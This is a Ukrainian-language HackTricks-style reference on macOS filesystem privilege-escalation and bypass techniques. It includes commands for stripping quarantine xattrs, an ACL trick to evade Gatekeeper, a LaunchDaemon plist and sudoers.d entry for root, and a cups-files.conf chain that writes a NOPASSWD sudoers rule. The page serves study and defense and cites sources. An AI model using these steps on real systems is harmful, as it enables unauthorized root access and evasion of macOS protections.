# Трюки з FS у macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Комбінації POSIX permissions

Для **directory** три біти permissions означають дещо інше, ніж для звичайного file. `chmod(1)` називає біт execute "**search**", коли його застосовано до directory:<sup>[[2]](#references)</sup>

> `0100` Для files дозволяє виконання owner. Для directories дозволяє owner виконувати **search** у directory.

- **read** — ви можете **перераховувати** entries у directory (переглядати імена).
- **write** — ви можете **створювати, перейменовувати та видаляти entries** у directory. Зверніть увагу, що це властивість *containing* directory, а не file: ви можете видалити file, який не можете читати або змінювати, якщо маєте можливість запису до його parent directory.
- Щоб видалити **subdirectory**, він має бути порожнім, що своєю чергою вимагає достатніх прав для видалення всього вмісту всередині нього.
- Якщо directory має **sticky bit** (`S_ISVTX`, як `/tmp`), це обмежено — POSIX визначає, що процес може видаляти або перейменовувати files у ньому лише якщо він є owner file, owner directory або має відповідні privileges.<sup>[[1]](#references)</sup>
- **execute / search** — вам **дозволено проходити** через directory. Розв’язання pathname знаходить кожен компонент "у directory, указаному його попередником", тому **втрата прав search на будь-якому окремому компоненті префікса path робить усе нижче нього недоступним за path**, навіть якщо сам leaf file доступний для читання всіма.<sup>[[1]](#references)</sup>

### Небезпечні комбінації

**Як перезаписати file/folder, owner якого є root**, якщо:

- Один **owner** parent **directory** у path є user
- Один **owner** parent **directory** у path є **users group** з **write access**
- **users group** має **write** access до **file**

За будь-якої з наведених комбінацій attacker може **вставити** **sym/hard link** у очікуваний path, щоб отримати привілейований arbitrary write.

### Особливий випадок Folder root R+X

Це безпосередньо випливає з наведеного вище правила розв’язання pathname. Якщо **directory надає лише R+X root**, files усередині нього недоступні *за path* для всіх інших — але власні permission bits **files** усе ще можуть бути permissive. Directory — єдина перешкода.

Отже, будь-який primitive, який дозволяє перемістити file **з цього directory** — privileged process, що **переміщує/перейменовує/копіює** path, вибраний attacker, у location, через який ви можете проходити, — перетворюється на arbitrary read без необхідності обходити власний mode file:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Шукайте privileged file movers (інсталятори, ротатори логів, збирачі crash/diagnostic даних, функції backup і "export"), які приймають шлях до source від користувача з нижчими привілеями.

## Symbolic Link / Hard Link

### Permissive file/folder

Якщо privileged process записує дані у **file**, який може бути **controlled** користувачем із **нижчими привілеями**, або який міг бути **previously created** користувачем із нижчими привілеями. Користувач може просто **вказати його на інший file** через Symbolic або Hard link, і privileged process запише дані саме в цей file.

Перевірте інші розділи, де attacker може **зловживати довільним записом для підвищення привілеїв**.

### Open `O_NOFOLLOW`

Згідно з [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Якщо `O_NOFOLLOW` використовується у mask, а target file, переданий до `open()`, є symbolic link, тоді `open()` завершиться помилкою."* Перевіряється лише **кінцевий** компонент — кожен **проміжний** компонент усе ще визначається та переходить за ним. Тому developer, який "захистив" запис за допомогою `O_NOFOLLOW`, усе ще може бути атакований шляхом розміщення symlink у будь-якому **parent directory** цільового шляху.<sup>[[3]](#references)</sup>

У тій самій man page документовано flags, які справді усувають цю проблему:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"якщо ... будь-який компонент шляху, переданого до `open()`, є symbolic link, тоді `open()` завершиться помилкою."*
- **`O_RESOLVE_BENEATH`** — *"якщо ... зазначене визначення шляху виходить за межі directory, пов’язаного з fd, тоді `openat()` завершиться помилкою."*

В іншому разі `openat()` відносно directory FD, який ви вже перевірили, або `realpath()` + повторна перевірка залишаються способами запобігти symlink swaps у середині шляху.

## .fileloc

Files із розширенням **`.fileloc`** можуть вказувати на інші applications або binaries, тому під час їх відкриття буде виконано саме цю application/binary.\
Приклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Дескриптори файлів

### Leak FD (no `O_CLOEXEC`)

Якщо виклик `open` не містить прапорця `O_CLOEXEC`, дескриптор файлу буде успадкований дочірнім процесом. Отже, якщо привілейований процес відкриває привілейований файл і запускає процес, контрольований атакувальником, атакувальник **успадкує FD привілейованого файлу**.

Канонічним прикладом є **`DYLD_PRINT_TO_FILE` LPE в OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` обробляв `DYLD_PRINT_TO_FILE=/path` навіть у **restricted (suid root) binaries**, оскільки цю змінну було розібрано за межами `processDyldEnvironmentVariable()`.
- Він виконував `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, тому **створював файл, власником якого був root, за довільним шляхом**.
- FD **ніколи не закривався і не мав прапорця close-on-exec**, тому кожен дочірній процес suid binary успадковував **доступний для запису FD до файлу, власником якого був root**.
- Запуск, наприклад, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, а потім читання номера успадкованого FD у дочірньому процесі надавали можливість довільного запису у файл, власником якого був root; `fcntl(fd, F_SETFL, 0)` навіть скидав `O_APPEND`, дозволяючи перезаписувати файл замість додавання в кінець.

Така сама схема виникає щоразу, коли привілейований процес відкриває файл **перед** виконанням через `exec` чогось, що ви контролюєте (helper tools, редактори у стилі `crontab`, запущені через `$EDITOR`, файли журналів/налагодження, відкриті за шляхом зі змінної середовища...). Перелічіть успадковані FD за допомогою:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Усе, що перевищує `2` і вказує на файл, який ви не можете відкрити самостійно, є primitive arbitrary-write (або arbitrary-read).

## Уникайте tricks із quarantine xattrs

### Видаліть його
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### прапор uchg / uchange / uimmutable

Якщо файл/папка має цей атрибут immutable, додати до нього xattr буде неможливо
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Файлові системи без підтримки xattr

Не кожна файлова система, яку macOS може змонтувати, нативно зберігає **extended attributes**. HFS+ і APFS це підтримують; **FAT32, exFAT і (більшість) NFS-монтувань — ні** — macOS емулює їх, записуючи додатковий файл **AppleDouble** з назвою `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Це важливо для quarantine, оскільки xattr зберігається лише тоді, коли його справді можна записати **й знову прочитати** з того самого тому:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Якщо том пізніше читається через шлях, який ігнорує супровідний `._` (або супровідний файл видаляється), файл надходить **без прапора quarantine** — і непоміченого quarantine `.app` достатньо, щоб обійти App Sandbox, як описано в [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Цей ACL забороняє додавати `xattrs` до файлу
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Формат файлів **AppleDouble** копіює файл разом із його ACE.

У [**вихідному коді**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) можна побачити, що текстове представлення ACL, збережене всередині xattr під назвою **`com.apple.acl.text`**, буде встановлено як ACL у розпакованому файлі. Отже, якщо стиснути application у zip-файл у форматі **AppleDouble** з ACL, який забороняє запис інших xattr до нього... quarantine xattr не буде встановлено в application:

Перегляньте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) для отримання додаткової інформації.<sup>[[6]](#references)</sup>

Щоб відтворити це, спочатку потрібно отримати правильний рядок acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Зверніть увагу, що навіть якщо це спрацює, sandbox спочатку записує quarantine xattr)

Насправді не потрібно, але залишаю це тут про всяк випадок:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Обхід перевірок підпису

### Обхід перевірок platform binaries

Деякі перевірки безпеки перевіряють, чи є binary **platform binary**, наприклад, щоб дозволити підключення до XPC service. Однак, як показано в описі обходу на https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, цю перевірку можна обійти, отримавши platform binary (наприклад, /bin/ls) і впровадивши exploit через dyld за допомогою змінної середовища `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Обхід прапорців `CS_REQUIRE_LV` і `CS_FORCED_LV`

Виконуваний binary може змінити власні прапорці, щоб обійти перевірки, за допомогою такого коду:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Обхід Code Signatures

Bundles містять файл **`_CodeSignature/CodeResources`**, який містить **hash** кожного окремого **файлу** в **bundle**. Зверніть увагу, що **hash** CodeResources також **вбудований у executable**, тому ми не можемо змінити й його.

Однак є деякі файли, підпис яких не перевірятиметься. Вони мають ключ `omit` у plist, наприклад:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Підпис ресурсу можна обчислити з CLI за допомогою:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Монтування dmgs

Користувач може змонтувати власний dmg, створений навіть поверх деяких наявних папок. Ось як можна створити власний пакет dmg із власним вмістом:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Зазвичай macOS монтує диски, взаємодіючи з Mach-сервісом `com.apple.DiskArbitrarion.diskarbitrariond` (який надається `/usr/libexec/diskarbitrationd`). Якщо додати параметр `-d` до plist-файлу LaunchDaemons і перезапустити службу, журнали зберігатимуться у `/var/log/diskarbitrationd.log`.\
Однак можна використовувати такі інструменти, як `hdik` і `hdiutil`, для безпосередньої взаємодії з kext `com.apple.driver.DiskImages`.

## Довільний запис

### Періодичні sh-скрипти

Якщо ваш скрипт може інтерпретуватися як **shell script**, ви можете перезаписати **`/etc/periodic/daily/999.local`** shell script, який запускатиметься щодня.

Ви можете **імітувати** виконання цього скрипту за допомогою: **`sudo periodic daily`**

### Daemons

Створіть довільний **LaunchDaemon**, наприклад **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, із plist, який виконує довільний скрипт, наприклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Просто створіть скрипт `/Applications/Scripts/privesc.sh` із **командами**, які ви хотіли б виконати від імені root.

### Sudoers File

Якщо у вас є **arbitrary write**, ви можете створити файл у папці **`/etc/sudoers.d/`**, надавши собі привілеї **sudo**.

### PATH files

Файл **`/etc/paths`** є одним із основних місць, звідки заповнюється змінна середовища PATH. Для його перезапису потрібні права root, але якщо скрипт із **privileged process** виконує певну **команду без повного шляху**, ви можете отримати змогу **hijack** її, змінивши цей файл.

Також можна записувати файли в **`/etc/paths.d`**, щоб додавати нові папки до змінної середовища `PATH`.

### cups-files.conf

Цю техніку використано в [цьому writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Створіть файл `/etc/cups/cups-files.conf` із таким вмістом:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Це створить файл `/etc/sudoers.d/lpe` із дозволами 777. Додатковий непотрібний текст наприкінці потрібен для запуску створення error log.

Потім запишіть у `/etc/sudoers.d/lpe` необхідну конфігурацію для підвищення привілеїв, наприклад `%staff ALL=(ALL) NOPASSWD:ALL`.

Після цього знову змініть файл `/etc/cups/cups-files.conf`, указавши `LogFilePerm 700`, щоб новий файл sudoers став дійсним під час виклику `cupsctl`.

### Вихід із sandbox

Можна вийти з macOS sandbox за допомогою довільного запису у FS. Приклади наведено на сторінці [macOS Auto Start](../../../../macos-auto-start-locations.md), але поширений спосіб — записати файл налаштувань Terminal у `~/Library/Preferences/com.apple.Terminal.plist`, який виконує команду під час запуску, а потім викликати його за допомогою `open`.

## Створення доступних для запису файлів від імені інших користувачів

Дуже поширений privesc-примітив — змусити **привілейований процес створити для вас файл** у каталозі, яким ви керуєте, а потім зберегти **доступ на запис** до цього файлу. Потрібні дві умови:

1. Каталог, власником якого ви є (або в якому можна встановити **успадковуваний ACL**), щоб усе створене всередині успадковувало ваші дозволи.
2. Привілейований/`suid` процес, якому можна вказати, **де** створити файл — зазвичай через змінну середовища debug/logging, конфігураційний файл або XPC API helper-а.

Саме **успадковуваний ACL** дає змогу вам записувати у створений файл, навіть якщо його власником є інший користувач. Прапорці успадкування `file_inherit` / `directory_inherit` описані в [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Тепер будь-який файл, який привілейований процес створює всередині `$DIRNAME`, **доступний вам для запису**. Якщо цей каталог також є місцем, яке згодом **виконується від імені root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, каталог LaunchDaemon...), це пряме підвищення привілеїв до root. Див. наведені вище розділи [Файл Sudoers](#sudoers-file) і [cups-files.conf](#cups-filesconf), щоб дізнатися, що записати після отримання файлу.

Повний робочий приклад ланцюжка «змінна середовища змушує root-процес створити файл, а FD витікає до вас» наведено вище в розділі [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## Спільна пам’ять POSIX

**Спільна пам’ять POSIX** дає змогу процесам у POSIX-сумісних операційних системах отримувати доступ до спільної області пам’яті, забезпечуючи швидшу комунікацію порівняно з іншими методами міжпроцесної взаємодії. Вона передбачає створення або відкриття об’єкта спільної пам’яті за допомогою `shm_open()`, встановлення його розміру через `ftruncate()` і відображення його в адресний простір процесу за допомогою `mmap()`. Після цього процеси можуть безпосередньо читати з цієї області пам’яті та записувати до неї. Для керування одночасним доступом і запобігання пошкодженню даних часто використовують механізми синхронізації, такі як mutex або семафори. Зрештою процеси скасовують відображення та закривають спільну пам’ять за допомогою `munmap()` і `close()`, а за потреби видаляють об’єкт пам’яті через `shm_unlink()`. Ця система особливо ефективна для швидкої IPC у середовищах, де кільком процесам потрібно швидко отримувати доступ до спільних даних.

<details>

<summary>Приклад коду Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Приклад коду споживача</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Захищені дескриптори macOS

**macOSCguarded descriptors** — це функція безпеки, представлена в macOS для підвищення безпеки та надійності **операцій із файловими дескрипторами** в користувацьких застосунках. Ці захищені дескриптори дають змогу пов’язувати з файловими дескрипторами певні обмеження або «захисти», застосування яких контролюється kernel.

Ця функція особливо корисна для запобігання певним класам вразливостей безпеки, таким як **несанкціонований доступ до файлів** або **race conditions**. Ці вразливості виникають, наприклад, коли thread отримує доступ до file description, надаючи **іншому вразливому thread доступ до нього**, або коли file descriptor **успадковується** вразливим дочірнім процесом. Деякі функції, пов’язані з цією функціональністю:

- `guarded_open_np`: відкриває FD із guard
- `guarded_close_np`: закриває його
- `change_fdguard_np`: змінює прапорці guard у дескрипторі (навіть видаляючи захист guard)

## References

- [1] [POSIX.1-2024 — базові визначення, розд. 4 (дозволи доступу до файлів, захист каталогів, розв’язання шляхів)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [Сторінка man [`chmod(1)`]](https://keith.github.io/xcode-man-pages/chmod.1.html) (біт пошуку/виконання каталогу, прапорці успадкування ACL)
- [3] [Сторінка man [`open(2)`]](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins — OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD без close-on-exec)
- [5] [The Eclectic Light Company — Які файлові системи та cloud-сервіси зберігають розширені атрибути?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft — Achilles heel Gatekeeper: виявлення вразливості macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) — Нова ера macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji — Виявлення вразливостей Apple: історія аудиту diskarbitrationd і storagekitd, частина 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
